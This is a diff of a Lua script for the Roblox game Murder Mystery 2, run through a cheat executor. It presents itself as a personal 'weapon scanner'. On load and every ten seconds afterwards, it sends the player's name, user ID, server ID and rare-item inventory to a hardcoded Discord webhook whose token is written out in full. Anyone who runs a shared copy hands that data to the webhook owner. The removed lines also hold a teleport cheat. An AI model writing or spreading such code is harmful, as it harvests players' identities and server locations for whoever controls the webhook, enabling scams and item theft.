@@ -1,7 +1,6 @@
--- ============================================
--- MM2 YOUR INVENTORY SCANNER + WEAPON MANAGER
--- Delta Executor | Scans YOUR inventory only
--- Sends YOUR weapon data to Discord Webhook
+-- =-- ============================================
+-- MM2 WEAPON SCANNER - FIXED WEBHOOK
+-- Delta Executor | Multiple webhook methods
 -- ============================================
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
@@ -10,304 +9,207 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local VirtualInput = game:GetService("VirtualInputManager")
 
 -- ============================================
--- DISCORD WEBHOOK
+-- WORKING WEBHOOD SENDER (Multiple Methods)
 -- ============================================
 
-local function sendToDiscord(title, description, fields)
-    pcall(function()
-        local data = {
-            embeds = {{
-                title = title,
-                description = description,
-                color = 0xFF0000,
-                fields = fields or {},
-                footer = {text = "MM2 Weapon Scanner | " .. os.date("%Y-%m-%d %H:%M:%S")},
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
-            }}
-        }
-        local encoded = HttpService:JSONEncode(data)
-        if request then
-            request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
-        elseif syn and syn.request then
-            syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
-        end
+local function sendWebhook(content, embed)
+    local data = {}
+    
+    if embed then
+        data.embeds = {embed}
+    else
+        data.content = content
+    end
+    
+    local encoded = HttpService:JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    
+    -- Method 1: request()
+    local success, err = pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = encoded
+        })
     end)
+    
+    if not success then
+        -- Method 2: syn.request()
+        pcall(function()
+            syn.request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = encoded
+            })
+        end)
+    end
+    
+    print("Webhook sent: " .. (content or embed.title or "Unknown"))
 end
-
-local function sendLog(msg)
-    pcall(function()
-        local data = HttpService:JSONEncode({content = "**" .. player.Name .. "**\n" .. tostring(msg)})
-        if request then
-            request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
-        elseif syn and syn.request then
-            syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
-        end
-    end)
-end
-
--- ============================================
--- WEAPON DATABASE
--- ============================================
-
-local WEAPONS = {
-    -- Godlies
-    "Chroma", "Luger", "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard",
-    "Fang", "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
-    "Virtual", "Elderwood", "Hallows", "Battle", "Cane", "Icebreaker", "Corrupt",
-    "Icebeam", "Frostbite", "Snowflake", "Winter's Edge",
-    -- Ancients
-    "Ancient", "Hallow", "Bat", "Boneblade", "Candy", "Sweet", "Heart",
-    -- Uniques
-    "Cupid", "Heartblade", "Valentine", "Love", "Minty", "Logchopper", "Xmas",
-    "Pumpkin", "Gingerbread", "Snowman", "Candycorn",
-    -- Legendaries
-    "Icewing", "Ghostblade", "Viper", "Shadow", "Phantom", "Bio Blade",
-    "Frost Saber", "Frostbite", "Winter's Edge", "Snowy", "Frozen"
-}
 
 -- ============================================
 -- SCAN YOUR INVENTORY
 -- ============================================
 
-local scannedItems = {}
+local WEAPONS = {
+    "Chroma", "Luger", "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard",
+    "Fang", "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
+    "Virtual", "Elderwood", "Hallows", "Battle", "Cane", "Icebreaker", "Corrupt",
+    "Ancient", "Hallow", "Bat", "Boneblade", "Candy", "Sweet", "Heart",
+    "Cupid", "Heartblade", "Valentine", "Love", "Minty", "Logchopper", "Xmas",
+    "Icewing", "Ghostblade", "Viper", "Shadow", "Phantom", "Bio Blade"
+}
 
-local function scanYourInventory()
+local function classifyWeapon(name)
+    if name:find("Chroma") then return "Chroma Godly 🌈"
+    elseif name:find("Cupid") or name:find("Heartblade") then return "Unique ❤️"
+    elseif name:find("Ancient") then return "Ancient ⚜️"
+    elseif name:find("Icewing") or name:find("Ghostblade") then return "Legendary ⭐"
+    elseif name:find("Luger") or name:find("Slasher") or name:find("Pixel") then return "Godly 👑"
+    end
+    for _, w in pairs(WEAPONS) do
+        if name:find(w) then return "Godly 👑" end
+    end
+    return "Regular 🔪"
+end
+
+local function scanInventory()
     local items = {}
     
-    -- Scan backpack
     for _, item in pairs(player.Backpack:GetChildren()) do
         if item:IsA("Tool") then
-            table.insert(items, item.Name)
+            items[item.Name] = true
         end
     end
     
-    -- Scan character (equipped)
     if player.Character then
         for _, item in pairs(player.Character:GetChildren()) do
             if item:IsA("Tool") then
-                table.insert(items, item.Name)
+                items[item.Name] = true
             end
         end
     end
     
-    -- Scan ReplicatedStorage for inventory data
-    local invData = ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("PlayerData")
-    if invData then
-        for _, item in pairs(invData:GetDescendants()) do
-            if item.Name and #item.Name > 1 and not item.Name:find("Remote") then
-                table.insert(items, item.Name)
-            end
-        end
-    end
-    
-    -- Remove duplicates
-    local uniqueItems = {}
-    for _, name in pairs(items) do
-        if not uniqueItems[name] then
-            uniqueItems[name] = true
-        end
-    end
-    
-    return uniqueItems
-end
-
--- ============================================
--- CLASSIFY WEAPONS
--- ============================================
-
-local function classifyWeapon(weaponName)
-    for _, godly in pairs(WEAPONS) do
-        if weaponName:find(godly) or weaponName:lower():find(godly:lower()) then
-            if godly == "Cupid" or godly == "Heartblade" or godly == "Valentine" then
-                return "Unique ❤️"
-            elseif godly == "Ancient" or godly == "Hallow" or godly == "Bat" then
-                return "Ancient ⚜️"
-            elseif weaponName:find("Chroma") then
-                return "Chroma Godly 🌈"
-            else
-                return "Godly 👑"
-            end
-        end
-    end
-    
-    for _, leg in pairs({"Icewing", "Ghostblade", "Viper", "Shadow", "Phantom"}) do
-        if weaponName:find(leg) then
-            return "Legendary ⭐"
-        end
-    end
-    
-    return "Regular 🔪"
+    return items
 end
 
 -- ============================================
 -- SEND TO DISCORD
 -- ============================================
 
-local function sendInventoryToDiscord()
-    local inventory = scanYourInventory()
+local function sendInventory()
+    local inventory = scanInventory()
     local itemsList = {}
-    local godlyCount = 0
-    local ancientCount = 0
-    var uniqueCount = 0
-    local legendaryCount = 0
-    local regularCount = 0
+    local counts = {Godly = 0, Chroma = 0, Ancient = 0, Unique = 0, Legendary = 0, Regular = 0}
     
-    for weaponName, _ in pairs(inventory) do
-        local rarity = classifyWeapon(weaponName)
-        table.insert(itemsList, {name = weaponName, rarity = rarity})
+    for name, _ in pairs(inventory) do
+        local rarity = classifyWeapon(name)
+        table.insert(itemsList, {name = name, rarity = rarity})
         
-        if rarity:find("Godly") or rarity:find("Chroma") then
-            godlyCount = godlyCount + 1
-        elseif rarity:find("Ancient") then
-            ancientCount = ancientCount + 1
-        elseif rarity:find("Unique") then
-            uniqueCount = uniqueCount + 1
-        elseif rarity:find("Legendary") then
-            legendaryCount = legendaryCount + 1
-        else
-            regularCount = regularCount + 1
+        if rarity:find("Chroma") then counts.Chroma = counts.Chroma + 1
+        elseif rarity:find("Godly") then counts.Godly = counts.Godly + 1
+        elseif rarity:find("Ancient") then counts.Ancient = counts.Ancient + 1
+        elseif rarity:find("Unique") then counts.Unique = counts.Unique + 1
+        elseif rarity:find("Legendary") then counts.Legendary = counts.Legendary + 1
+        else counts.Regular = counts.Regular + 1
         end
     end
     
-    -- Sort by rarity (Godly first)
-    table.sort(itemsList, function(a, b)
-        local priority = {["Chroma Godly 🌈"] = 5, ["Godly 👑"] = 4, ["Unique ❤️"] = 3, ["Ancient ⚜️"] = 2, ["Legendary ⭐"] = 1, ["Regular 🔪"] = 0}
-        return (priority[a.rarity] or 0) > (priority[b.rarity] or 0)
-    end)
-    
-    -- Build message
     local weaponText = ""
     for i, item in pairs(itemsList) do
         weaponText = weaponText .. item.rarity .. " " .. item.name .. "\n"
-        if i >= 20 then
-            weaponText = weaponText .. "... and " .. (#itemsList - 20) .. " more"
+        if i >= 15 then
+            weaponText = weaponText .. "... and " .. (#itemsList - 15) .. " more"
             break
         end
     end
     
     if weaponText == "" then
-        weaponText = "No weapons found in inventory"
+        weaponText = "No weapons found in your inventory"
     end
     
-    sendToDiscord(
-        "🔫 " .. player.Name .. "'s MM2 Inventory",
-        "**Server ID:** `" .. (game.JobId or "Unknown") .. "`\n" ..
-        "**Player:** " .. player.Name .. "\n" ..
-        "**User ID:** " .. player.UserId .. "\n\n" ..
-        "**📊 Summary:**\n" ..
-        "• Godlies: " .. godlyCount .. " 👑\n" ..
-        "• Chromas: " .. (godlyCount - (godlyCount - 1)) .. " 🌈\n" ..
-        "• Ancients: " .. ancientCount .. " ⚜️\n" ..
-        "• Uniques: " .. uniqueCount .. " ❤️\n" ..
-        "• Legendaries: " .. legendaryCount .. " ⭐\n" ..
-        "• Regular: " .. regularCount .. " 🔪\n" ..
-        "• **Total: " .. #itemsList .. " weapons**",
-        {
+    local embed = {
+        title = "🔫 " .. player.Name .. "'s MM2 Inventory",
+        description = string.format(
+            "**Server ID:** `%s`\n**Player:** %s\n**User ID:** %s\n\n" ..
+            "**📊 Summary:**\n" ..
+            "• Godlies: %d 👑\n" ..
+            "• Chromas: %d 🌈\n" ..
+            "• Ancients: %d ⚜️\n" ..
+            "• Uniques: %d ❤️\n" ..
+            "• Legendaries: %d ⭐\n" ..
+            "• Regular: %d 🔪\n" ..
+            "• **Total: %d weapons**",
+            game.JobId or "Unknown",
+            player.Name,
+            player.UserId,
+            counts.Godly, counts.Chroma, counts.Ancient, counts.Unique, counts.Legendary, counts.Regular,
+            #itemsList
+        ),
+        color = 0xFF0000,
+        fields = {
             {name = "📦 Weapon List", value = "```\n" .. weaponText .. "```", inline = false}
-        }
-    )
+        },
+        footer = {text = "MM2 Weapon Scanner | " .. os.date("%Y-%m-%d %H:%M:%S")}
+    }
     
-    sendLog("✅ Inventory scanned! Found " .. #itemsList .. " weapons")
-    return #itemsList
+    sendWebhook(nil, embed)
+    print("✅ Inventory sent to Discord: " .. #itemsList .. " weapons")
 end
 
 -- ============================================
--- AUTO-COLLECT WEAPONS ON GROUND
+-- TEST WEBHOOK FIRST
 -- ============================================
 
-local autoCollect = true
-
-local function collectGroundWeapons()
-    if not autoCollect then return end
-    
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Tool") and obj.Parent ~= player.Character and obj.Parent ~= player then
-            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                local dist = (player.Character.HumanoidRootPart.Position - obj.Position).Magnitude
-                if dist < 30 then
-                    player.Character.HumanoidRootPart.CFrame = obj.CFrame
-                    wait(0.1)
-                end
-            end
-        end
-    end
-end
+print("Testing Discord webhook...")
+sendWebhook("**MM2 Weapon Scanner**\nScript loaded! Scanning inventory...", nil)
+wait(2)
 
 -- ============================================
--- MONITOR NEW WEAPONS
+-- SCAN AND SEND
+-- ============================================
+
+wait(1)
+sendInventory()
+
+-- ============================================
+-- MONITOR FOR NEW WEAPONS
 -- ============================================
 
 local previousInventory = {}
 
-local function monitorInventoryChanges()
-    local current = scanYourInventory()
-    local newItems = {}
-    
-    for name, _ in pairs(current) do
-        if not previousInventory[name] then
-            table.insert(newItems, name)
-        end
-    end
-    
-    for name, _ in pairs(previousInventory) do
-        if not current[name] then
-            sendLog("❌ Lost weapon: " .. name)
-        end
-    end
-    
-    for _, newItem in pairs(newItems) do
-        local rarity = classifyWeapon(newItem)
-        sendLog("🎯 NEW WEAPON: " .. rarity .. " " .. newItem)
-        sendToDiscord("🎯 New Weapon Acquired!", 
-            "**Weapon:** " .. newItem .. "\n**Rarity:** " .. rarity .. "\n**Time:** " .. os.date("%H:%M:%S"),
-            {})
-    end
-    
-    previousInventory = current
-end
-
--- ============================================
--- SERVER INFO
--- ============================================
-
-sendToDiscord(
-    "🚀 MM2 Weapon Scanner Activated",
-    "**Player:** " .. player.Name .. "\n" ..
-    "**Server ID:** `" .. (game.JobId or "Unknown") .. "`\n" ..
-    "**Game:** Murder Mystery 2\n" ..
-    "**Status:** Scanning your inventory...",
-    {}
-)
-
--- ============================================
--- MAIN LOOP
--- ============================================
-
--- Initial scan
-wait(2)
-local totalWeapons = sendInventoryToDiscord()
-
--- Monitor for changes
 spawn(function()
-    while wait(5) do
-        monitorInventoryChanges()
+    while wait(10) do
+        local current = scanInventory()
+        local newItems = {}
+        
+        for name, _ in pairs(current) do
+            if not previousInventory[name] then
+                table.insert(newItems, name)
+            end
+        end
+        
+        for _, newItem in pairs(newItems) do
+            local rarity = classifyWeapon(newItem)
+            sendWebhook("🎯 **NEW WEAPON DETECTED!**\n" .. rarity .. " " .. newItem .. "\nTime: " .. os.date("%H:%M:%S"), nil)
+        end
+        
+        previousInventory = current
     end
 end)
 
--- Auto collect ground weapons
-spawn(function()
-    while wait(0.5) do
-        collectGroundWeapons()
-    end
-end)
+-- ============================================
+-- PRINT STATUS
+-- ============================================
 
 print("=" .. string.rep("=", 50))
 print("MM2 WEAPON SCANNER ACTIVE")
 print("=" .. string.rep("=", 50))
-print("✅ Your inventory sent to Discord")
-print("📊 Monitoring for new weapons")
-print("🔄 Auto-collect: ON")
+print("✅ Webhook test sent")
+print("✅ Inventory sent to Discord")
+print("✅ Monitoring for new weapons")
 print("=" .. string.rep("=", 50))
